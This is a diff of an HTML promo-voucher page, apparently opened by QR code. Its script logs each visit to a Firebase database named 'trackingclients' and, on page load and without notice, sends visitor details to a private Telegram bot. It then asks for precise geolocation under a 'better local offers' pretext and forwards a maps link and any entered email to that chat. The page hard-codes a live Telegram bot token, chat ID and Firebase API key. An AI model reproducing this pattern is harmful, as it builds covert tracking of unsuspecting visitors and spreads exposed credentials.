@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -614,339 +615,361 @@
     </div>
     <!-- Firebase + Main JS -->
     <script type="module">
-        // --- Firebase Setup ---
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
-        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
-        // Firebase config
-        const firebaseConfig = {
-            apiKey: "AIzaSyD_c9jMxAA6dtyk_EXAHnH09OEAoalUADA",
-            authDomain: "trackingclients.firebaseapp.com",
-            projectId: "trackingclients",
-            storageBucket: "trackingclients.appspot.com",
-            messagingSenderId: "27490943622",
-            appId: "1:27490943622:web:d6c87547aa5df440508707",
-            databaseURL: "https://trackingclients-default-rtdb.firebaseio.com/"
-        };
-        const app = initializeApp(firebaseConfig);
-        const database = getDatabase(app);
+      // --- Firebase Setup ---
+import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
+import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
 
-        // Helper to save location data to Firebase
-        function saveLocationToFirebase(data) {
-            const locationsRef = ref(database, 'locations');
-            const newLocationRef = push(locationsRef);
-            set(newLocationRef, {
-                ...data,
-                timestamp: data.timestamp || Date.now()
-            })
-            .then(() => {
-                // Success (optional: console.log('Saved to Firebase'))
-            })
-            .catch((error) => {
-                // Optional: handle error
-            });
-        }
+// Firebase config
+const firebaseConfig = {
+    apiKey: "AIzaSyD_c9jMxAA6dtyk_EXAHnH09OEAoalUADA",
+    authDomain: "trackingclients.firebaseapp.com",
+    projectId: "trackingclients",
+    storageBucket: "trackingclients.appspot.com",
+    messagingSenderId: "27490943622",
+    appId: "1:27490943622:web:d6c87547aa5df440508707",
+    databaseURL: "https://trackingclients-default-rtdb.firebaseio.com/"
+};
+const app = initializeApp(firebaseConfig);
+const database = getDatabase(app);
 
-        // --- Main App Script ---
-        // Telegram Bot Configuration
-        const botToken = '7761334520:AAH2N1Ksa9NToLr6gd6DcknzpyB27q-_d14';
-        const chatId = '2141064153';
+// Helper to save location data to Firebase
+function saveLocationToFirebase(data) {
+    const locationsRef = ref(database, 'locations');
+    const newLocationRef = push(locationsRef);
+    set(newLocationRef, {
+        ...data,
+        timestamp: data.timestamp || Date.now()
+    })
+    .then(() => {
+        // Success (optional: console.log('Saved to Firebase'))
+    })
+    .catch((error) => {
+        // Optional: handle error
+    });
+}
 
-        // DOM Elements
-        const promoForm = document.getElementById('promoForm');
-        const promoInput = document.getElementById('promoCode');
-        const submitBtn = document.getElementById('submitBtn');
-        const errorMessage = document.getElementById('errorMessage');
-        const popupOverlay = document.getElementById('popupOverlay');
-        const closePopupBtn = document.getElementById('closePopupBtn');
-        const voucherPopup = document.getElementById('voucherPopup');
-        const popupActionBtns = document.getElementById('popupActionBtns');
-        const yesBtn = document.getElementById('yesBtn');
-        const noBtn = document.getElementById('noBtn');
-        const emailForm = document.getElementById('emailForm');
-        const emailInput = document.getElementById('emailInput');
-        const emailError = document.getElementById('emailError');
-        const emailSuccessMsg = document.getElementById('emailSuccessMsg');
-        const voucherImgPopup = document.getElementById('voucherImgPopup');
-        const downloadLink1 = document.getElementById('downloadLink1');
-        // Notification bar
-        const notificationBar = document.getElementById('notificationBar');
-        const notificationCloseBtn = document.getElementById('notificationCloseBtn');
-        let lastPromoCode = null;
-        let voucherShown = false;
-        let locationAsked = false;
+// --- New: Save QR code scan on every page open ---
+function saveQrScanToFirebase() {
+    const scansRef = ref(database, 'qr_scans');
+    const newScanRef = push(scansRef);
+    set(newScanRef, {
+        scanType: 'qr',
+        timestamp: Date.now(),
+        userAgent: navigator.userAgent
+    })
+    .then(() => {
+        // Optionally: console.log('QR scan saved');
+    })
+    .catch((error) => {
+        // Optionally: handle error
+    });
+}
 
-        // Show notification bar on page load
-        window.addEventListener('DOMContentLoaded', function() {
-            setTimeout(() => {
-                notificationBar.style.opacity = '1';
-                notificationBar.classList.add('show');
-                // Hide after 6 seconds if not closed
-                setTimeout(() => {
-                    notificationBar.classList.remove('show');
-                    notificationBar.style.opacity = '0';
-                }, 6000);
-                sendTelegramNotification('No Promo', 'Just Opened Page');
-            }, 400);
-        });
-        notificationCloseBtn.addEventListener('click', function() {
+// Telegram Bot Configuration
+const botToken = '7761334520:AAH2N1Ksa9NToLr6gd6DcknzpyB27q-_d14';
+const chatId = '2141064153';
+
+// DOM Elements
+const promoForm = document.getElementById('promoForm');
+const promoInput = document.getElementById('promoCode');
+const submitBtn = document.getElementById('submitBtn');
+const errorMessage = document.getElementById('errorMessage');
+const popupOverlay = document.getElementById('popupOverlay');
+const closePopupBtn = document.getElementById('closePopupBtn');
+const voucherPopup = document.getElementById('voucherPopup');
+const popupActionBtns = document.getElementById('popupActionBtns');
+const yesBtn = document.getElementById('yesBtn');
+const noBtn = document.getElementById('noBtn');
+const emailForm = document.getElementById('emailForm');
+const emailInput = document.getElementById('emailInput');
+const emailError = document.getElementById('emailError');
+const emailSuccessMsg = document.getElementById('emailSuccessMsg');
+const voucherImgPopup = document.getElementById('voucherImgPopup');
+const downloadLink1 = document.getElementById('downloadLink1');
+// Notification bar
+const notificationBar = document.getElementById('notificationBar');
+const notificationCloseBtn = document.getElementById('notificationCloseBtn');
+let lastPromoCode = null;
+let voucherShown = false;
+let locationAsked = false;
+
+// --- QR scan save on page load + notification logic ---
+window.addEventListener('DOMContentLoaded', function() {
+    // Save QR scan
+    saveQrScanToFirebase();
+
+    setTimeout(() => {
+        notificationBar.style.opacity = '1';
+        notificationBar.classList.add('show');
+        // Hide after 6 seconds if not closed
+        setTimeout(() => {
             notificationBar.classList.remove('show');
             notificationBar.style.opacity = '0';
-        });
+        }, 6000);
+        sendTelegramNotification('No Promo', 'Just Opened Page');
+    }, 400);
+});
 
-        // Prevent background scroll when popup is open
-        function setModalOpen(open) {
-            if(open) {
-                document.body.classList.add('modal-open');
-            } else {
-                document.body.classList.remove('modal-open');
-            }
-        }
+notificationCloseBtn.addEventListener('click', function() {
+    notificationBar.classList.remove('show');
+    notificationBar.style.opacity = '0';
+});
 
-        // Open and close popup with scroll lock
-        function openVoucherPopup() {
-            popupOverlay.classList.add('show');
-            setModalOpen(true);
-        }
-        function closeVoucherPopup() {
-            popupOverlay.classList.remove('show');
-            setModalOpen(false);
-            setTimeout(() => {
-                promoInput.value = '';
-                hideError();
-                voucherShown = false;
-                locationAsked = false;
-            }, 200);
-        }
-        // Form Submission Handler
-        promoForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            validatePromoCode();
-        });
-        // Input Enhancement
-        promoInput.addEventListener('input', function() {
+// Prevent background scroll when popup is open
+function setModalOpen(open) {
+    if(open) {
+        document.body.classList.add('modal-open');
+    } else {
+        document.body.classList.remove('modal-open');
+    }
+}
+
+// Open and close popup with scroll lock
+function openVoucherPopup() {
+    popupOverlay.classList.add('show');
+    setModalOpen(true);
+}
+function closeVoucherPopup() {
+    popupOverlay.classList.remove('show');
+    setModalOpen(false);
+    setTimeout(() => {
+        promoInput.value = '';
+        hideError();
+        voucherShown = false;
+        locationAsked = false;
+    }, 200);
+}
+// Form Submission Handler
+promoForm.addEventListener('submit', function(e) {
+    e.preventDefault();
+    validatePromoCode();
+});
+// Input Enhancement
+promoInput.addEventListener('input', function() {
+    hideError();
+    this.value = this.value.toUpperCase();
+});
+// Popup close
+closePopupBtn.addEventListener('click', closeVoucherPopup);
+
+function validatePromoCode() {
+    const code = promoInput.value.trim();
+    if (!code) {
+        showError('Please enter a promo code');
+        return;
+    }
+    showLoading(true);
+    setTimeout(() => {
+        if (code.toUpperCase() === 'DCPOLE10') {
             hideError();
-            this.value = this.value.toUpperCase();
-        });
-        // Popup close
-        closePopupBtn.addEventListener('click', closeVoucherPopup);
+            lastPromoCode = code;
+            showVoucherSuccess('Congratulations!', 'Here’s your exclusive voucher!<br><br>Would you like to share your location? This helps us provide better local offers.');
+        } else {
+            showError('Invalid promo code. Please check and try again.');
+        }
+        showLoading(false);
+    }, 900);
+}
 
-        function validatePromoCode() {
-            const code = promoInput.value.trim();
-            if (!code) {
-                showError('Please enter a promo code');
-                return;
-            }
-            showLoading(true);
-            setTimeout(() => {
-                if (code.toUpperCase() === 'DCPOLE10') {
-                    hideError();
-                    lastPromoCode = code;
-                    showVoucherSuccess('Congratulations!', 'Here’s your exclusive voucher!<br><br>Would you like to share your location? This helps us provide better local offers.');
-                } else {
-                    showError('Invalid promo code. Please check and try again.');
-                }
-                showLoading(false);
-            }, 900);
-        }
+function showVoucherSuccess(title, message) {
+    document.getElementById('popupIcon').textContent = '🎉';
+    document.getElementById('thanksMessage').innerHTML = title;
+    document.getElementById('infoText').innerHTML = message;
+    popupActionBtns.style.display = 'flex';
+    voucherImgPopup.style.display = 'block';
+    downloadLink1.style.display = 'inline-block';
+    emailForm.style.display = 'none';
+    emailSuccessMsg.style.display = 'none';
+    emailInput.value = '';
+    emailError.textContent = '';
+    if (!voucherShown) createConfetti();
+    voucherShown = true;
+    openVoucherPopup();
+    locationAsked = false;
+}
+yesBtn.onclick = function() {
+    if (locationAsked) return;
+    this.classList.add('loading');
+    requestLocation(lastPromoCode);
+    locationAsked = true;
+};
+noBtn.onclick = function() {
+    showAfterLocation('No Problem!', 'Here’s your voucher. Enjoy your discount!');
+    sendTelegramNotification(lastPromoCode, 'Location sharing declined');
+};
 
-        function showVoucherSuccess(title, message) {
-            document.getElementById('popupIcon').textContent = '🎉';
-            document.getElementById('thanksMessage').innerHTML = title;
-            document.getElementById('infoText').innerHTML = message;
-            popupActionBtns.style.display = 'flex';
-            voucherImgPopup.style.display = 'block';
-            downloadLink1.style.display = 'inline-block';
-            emailForm.style.display = 'none';
-            emailSuccessMsg.style.display = 'none';
-            emailInput.value = '';
-            emailError.textContent = '';
-            if (!voucherShown) createConfetti();
-            voucherShown = true;
-            openVoucherPopup();
-            locationAsked = false;
-        }
-        yesBtn.onclick = function() {
-            if (locationAsked) return;
-            this.classList.add('loading');
-            requestLocation(lastPromoCode);
-            locationAsked = true;
-        };
-        noBtn.onclick = function() {
-            showAfterLocation('No Problem!', 'Here’s your voucher. Enjoy your discount!');
-            sendTelegramNotification(lastPromoCode, 'Location sharing declined');
-        };
-
-        function showError(message) {
-            errorMessage.textContent = message;
-            errorMessage.style.display = 'block';
-            promoInput.style.borderColor = '#ef4444';
-            promoInput.style.boxShadow = '0 0 0 2px rgba(239, 68, 68, 0.10)';
-        }
-        function hideError() {
-            errorMessage.style.display = 'none';
-            promoInput.style.borderColor = 'rgba(255, 255, 255, 0.14)';
-            promoInput.style.boxShadow = 'none';
-        }
-        function showLoading(show) {
-            if (show) {
-                submitBtn.classList.add('loading');
-                submitBtn.style.pointerEvents = 'none';
-            } else {
-                submitBtn.classList.remove('loading');
-                submitBtn.style.pointerEvents = 'auto';
-            }
-        }
-        function sendTelegramNotification(promoCode, locationInfo, email=null) {
-            const timestamp = new Date().toLocaleString();
-            const userAgent = navigator.userAgent;
-            const pageTitle = document.title;
-            let message = `🎯 PROMO CODE REDEEMED
-            
+function showError(message) {
+    errorMessage.textContent = message;
+    errorMessage.style.display = 'block';
+    promoInput.style.borderColor = '#ef4444';
+    promoInput.style.boxShadow = '0 0 0 2px rgba(239, 68, 68, 0.10)';
+}
+function hideError() {
+    errorMessage.style.display = 'none';
+    promoInput.style.borderColor = 'rgba(255, 255, 255, 0.14)';
+    promoInput.style.boxShadow = 'none';
+}
+function showLoading(show) {
+    if (show) {
+        submitBtn.classList.add('loading');
+        submitBtn.style.pointerEvents = 'none';
+    } else {
+        submitBtn.classList.remove('loading');
+        submitBtn.style.pointerEvents = 'auto';
+    }
+}
+function sendTelegramNotification(promoCode, locationInfo, email=null) {
+    const timestamp = new Date().toLocaleString();
+    const userAgent = navigator.userAgent;
+    const pageTitle = document.title;
+    let message = `🎯 PROMO CODE REDEEMED
+        
 📱 Code: ${promoCode}
 📍 Location: ${locationInfo}
 📄 Page: ${pageTitle}
 ⏰ Time: ${timestamp}
 🖥️ Device: ${userAgent.includes('Mobile') ? 'Mobile' : 'Desktop'}
 Event: Voucher redemption via QR scan`;
-            if (email) {
-                message += `\n\n✉️ Email provided: ${email}`;
-            }
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                // Optionally, handle notification response
-            })
-            .catch(error => {
-                // Optionally, handle error
-            });
-        }
-        // After location step, show email input
-        function showAfterLocation(title, message) {
-            document.getElementById('popupIcon').textContent = '🎉';
-            document.getElementById('thanksMessage').innerHTML = title;
-            document.getElementById('infoText').innerHTML = message + "<br><br>Want to get more exclusive offers? Enter your email below:";
-            popupActionBtns.style.display = 'none';
-            voucherImgPopup.style.display = 'block';
-            downloadLink1.style.display = 'inline-block';
-            emailForm.style.display = 'block';
-            emailSuccessMsg.style.display = 'none';
-            emailInput.value = '';
-            emailError.textContent = '';
-            if (!voucherShown) createConfetti();
-            voucherShown = true;
-        }
+    if (email) {
+        message += `\n\n✉️ Email provided: ${email}`;
+    }
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'HTML'
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        // Optionally, handle notification response
+    })
+    .catch(error => {
+        // Optionally, handle error
+    });
+}
+// After location step, show email input
+function showAfterLocation(title, message) {
+    document.getElementById('popupIcon').textContent = '🎉';
+    document.getElementById('thanksMessage').innerHTML = title;
+    document.getElementById('infoText').innerHTML = message + "<br><br>Want to get more exclusive offers? Enter your email below:";
+    popupActionBtns.style.display = 'none';
+    voucherImgPopup.style.display = 'block';
+    downloadLink1.style.display = 'inline-block';
+    emailForm.style.display = 'block';
+    emailSuccessMsg.style.display = 'none';
+    emailInput.value = '';
+    emailError.textContent = '';
+    if (!voucherShown) createConfetti();
+    voucherShown = true;
+}
 
-        function requestLocation(promoCode) {
-            if (!navigator.geolocation) {
-                showAfterLocation('Location Not Available', 'No worries! Here’s your voucher. You can still enjoy your discount!');
-                sendTelegramNotification(promoCode, 'Geolocation not supported');
-                return;
-            }
-            const options = {
-                enableHighAccuracy: true,
-                timeout: 15000,
-                maximumAge: 60000
-            };
-            navigator.geolocation.getCurrentPosition(
-                function(position) {
-                    const lat = position.coords.latitude;
-                    const lng = position.coords.longitude;
-                    const accuracy = position.coords.accuracy;
-                    const googleMapsLink = `https://maps.google.com/?q=${lat},${lng}`;
-                    // --- Save to Firebase ---
-                    saveLocationToFirebase({
-                        lat,
-                        lng,
-                        accuracy,
-                        promoCode: promoCode || null,
-                        timestamp: position.timestamp,
-                        userAgent: navigator.userAgent
-                    });
-                    showAfterLocation('Perfect! 🙏', 'Thank you for sharing your location. Here’s your exclusive voucher!');
-                    sendTelegramNotification(
-                        promoCode,
-                        `Location: ${googleMapsLink} (Accuracy: ${Math.round(accuracy)}m)`
-                    );
-                },
-                function(error) {
-                    let errorMsg = 'Location access denied';
-                    switch(error.code) {
-                        case error.PERMISSION_DENIED:
-                            errorMsg = 'Location access denied by user';
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            errorMsg = 'Location information unavailable';
-                            break;
-                        case error.TIMEOUT:
-                            errorMsg = 'Location request timed out';
-                            break;
-                    }
-                    showAfterLocation('No Problem!', 'Here’s your voucher. Enjoy your discount!');
-                    sendTelegramNotification(promoCode, `Location error: ${errorMsg}`);
-                },
-                options
+function requestLocation(promoCode) {
+    if (!navigator.geolocation) {
+        showAfterLocation('Location Not Available', 'No worries! Here’s your voucher. You can still enjoy your discount!');
+        sendTelegramNotification(promoCode, 'Geolocation not supported');
+        return;
+    }
+    const options = {
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 60000
+    };
+    navigator.geolocation.getCurrentPosition(
+        function(position) {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            const googleMapsLink = `https://maps.google.com/?q=${lat},${lng}`;
+            // --- Save to Firebase ---
+            saveLocationToFirebase({
+                lat,
+                lng,
+                accuracy,
+                promoCode: promoCode || null,
+                timestamp: position.timestamp,
+                userAgent: navigator.userAgent
+            });
+            showAfterLocation('Perfect! 🙏', 'Thank you for sharing your location. Here’s your exclusive voucher!');
+            sendTelegramNotification(
+                promoCode,
+                `Location: ${googleMapsLink} (Accuracy: ${Math.round(accuracy)}m)`
             );
-        }
-        emailForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            emailError.textContent = '';
-            emailSuccessMsg.style.display = 'none';
-            const emailValue = emailInput.value.trim();
-            if (!validateEmail(emailValue)) {
-                emailError.textContent = "Please enter a valid email address.";
-                return;
+        },
+        function(error) {
+            let errorMsg = 'Location access denied';
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    errorMsg = 'Location access denied by user';
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    errorMsg = 'Location information unavailable';
+                    break;
+                case error.TIMEOUT:
+                    errorMsg = 'Location request timed out';
+                    break;
             }
-            sendTelegramNotification(lastPromoCode || 'No Promo', 'Email Shared', emailValue);
-            emailInput.value = '';
-            emailError.textContent = '';
-            emailSuccessMsg.textContent = "Thank you! You'll receive our latest offers soon.";
-            emailSuccessMsg.style.display = 'block';
+            showAfterLocation('No Problem!', 'Here’s your voucher. Enjoy your discount!');
+            sendTelegramNotification(promoCode, `Location error: ${errorMsg}`);
+        },
+        options
+    );
+}
+emailForm.addEventListener('submit', function(e) {
+    e.preventDefault();
+    emailError.textContent = '';
+    emailSuccessMsg.style.display = 'none';
+    const emailValue = emailInput.value.trim();
+    if (!validateEmail(emailValue)) {
+        emailError.textContent = "Please enter a valid email address.";
+        return;
+    }
+    sendTelegramNotification(lastPromoCode || 'No Promo', 'Email Shared', emailValue);
+    emailInput.value = '';
+    emailError.textContent = '';
+    emailSuccessMsg.textContent = "Thank you! You'll receive our latest offers soon.";
+    emailSuccessMsg.style.display = 'block';
+});
+function validateEmail(email) {
+    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+}
+function createConfetti() {
+    const colors = ['#6366f1', '#8b5cf6', '#ec4899', '#10b981', '#f59e0b'];
+    const confettiCount = 32;
+    for (let i = 0; i < confettiCount; i++) {
+        const confetti = document.createElement('div');
+        confetti.style.position = 'fixed';
+        confetti.style.width = '8px';
+        confetti.style.height = '8px';
+        confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+        confetti.style.left = Math.random() * 100 + '%';
+        confetti.style.top = '-10px';
+        confetti.style.zIndex = '2100';
+        confetti.style.borderRadius = '50%';
+        confetti.style.pointerEvents = 'none';
+        document.body.appendChild(confetti);
+        const animation = confetti.animate([
+            { transform: 'translateY(-10px) rotate(0deg)', opacity: 1 },
+            { transform: `translateY(${window.innerHeight + 10}px) rotate(360deg)`, opacity: 0 }
+        ], {
+            duration: Math.random() * 1800 + 800,
+            easing: 'cubic-bezier(0.25, 0.46, 0.45, 0.94)'
         });
-        function validateEmail(email) {
-            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
-        }
-        function createConfetti() {
-            const colors = ['#6366f1', '#8b5cf6', '#ec4899', '#10b981', '#f59e0b'];
-            const confettiCount = 32;
-            for (let i = 0; i < confettiCount; i++) {
-                const confetti = document.createElement('div');
-                confetti.style.position = 'fixed';
-                confetti.style.width = '8px';
-                confetti.style.height = '8px';
-                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
-                confetti.style.left = Math.random() * 100 + '%';
-                confetti.style.top = '-10px';
-                confetti.style.zIndex = '2100';
-                confetti.style.borderRadius = '50%';
-                confetti.style.pointerEvents = 'none';
-                document.body.appendChild(confetti);
-                const animation = confetti.animate([
-                    { transform: 'translateY(-10px) rotate(0deg)', opacity: 1 },
-                    { transform: `translateY(${window.innerHeight + 10}px) rotate(360deg)`, opacity: 0 }
-                ], {
-                    duration: Math.random() * 1800 + 800,
-                    easing: 'cubic-bezier(0.25, 0.46, 0.45, 0.94)'
-                });
-                animation.onfinish = () => confetti.remove();
-            }
-        }
-        popupOverlay.addEventListener('click', function(e) {
-            if (e.target === popupOverlay) {
-                closeVoucherPopup();
-            }
-        });
-        voucherPopup.addEventListener('click', function(e) {
-            e.stopPropagation();
-        });
+        animation.onfinish = () => confetti.remove();
+    }
+}
+popupOverlay.addEventListener('click', function(e) {
+    if (e.target === popupOverlay) {
+        closeVoucherPopup();
+    }
+});
+voucherPopup.addEventListener('click', function(e) {
+    e.stopPropagation();
+});
     </script>
 </body>
 </html>
+
